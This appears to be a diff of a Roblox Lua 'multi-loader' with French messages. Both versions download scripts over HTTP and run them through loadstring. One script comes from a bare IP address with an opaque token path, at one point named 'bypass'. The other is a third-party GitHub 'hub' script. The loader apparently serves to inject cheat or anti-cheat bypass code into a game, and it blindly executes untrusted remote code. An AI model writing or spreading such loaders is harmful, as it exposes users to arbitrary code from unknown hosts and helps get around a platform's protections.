@@ -1,34 +1,24 @@
-print("--- Lancement du Multi-Loader ---")
+local scripts = {
+    {
+        name = "Script 1",
+        url = "http://72.56.64.162/FHzzWdWOgarnc175Qk54Grdp1wxlZlaWoZFMajGib8P5aDpda8Y4FKjtLRwrL6zyVN15YJyEeQwnvX7x"
+    },
+    {
+        name = "ArgonHubX",
+        url = "https://raw.githubusercontent.com/orialdev/VisionHub/refs/heads/main/main.lua"
+    }
+}
 
--- Fonction sécurisée pour charger les scripts
-local function safeLoad(name, url)
-    print("Tentative de chargement : " .. name)
-    local success, content = pcall(function()
-        return game:HttpGet(url)
-    end)
-
-    if success and content then
-        local func, err = loadstring(content)
-        if func then
-            task.spawn(function()
-                local runSuccess, runErr = pcall(func)
-                if not runSuccess then
-                    warn(name .. " Erreur d'exécution : " .. tostring(runErr))
-                end
-            end)
-            print(name .. " chargé avec succès.")
+for _, script in ipairs(scripts) do
+    spawn(function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet(script.url))()
+        end)
+        
+        if success then
+            print("✓ " .. script.name .. " chargé avec succès")
         else
-            warn(name .. " Erreur de compilation : " .. tostring(err))
+            warn("✗ " .. script.name .. " a échoué: " .. tostring(err))
         end
-    else
-        warn("Impossible de récupérer le lien pour " .. name)
-    end
+    end)
 end
-
--- 1. Exécution immédiate du nouveau script (Anciennement EBK)
-safeLoad("bypass", "http://72.56.64.162/FHzzWdWOgarnc175Qk54Grdp1wxlZlaWoZFMajGib8P5aDpda8Y4FKjtLRwrL6zyVN15YJyEeQwnvX7x")
-
--- 2. Exécution de Argon après un délai de 3 secondes
-task.delay(3, function()
-    safeLoad("VisionHub", "https://raw.githubusercontent.com/orialdev/VisionHub/refs/heads/main/main.lua")
-end)
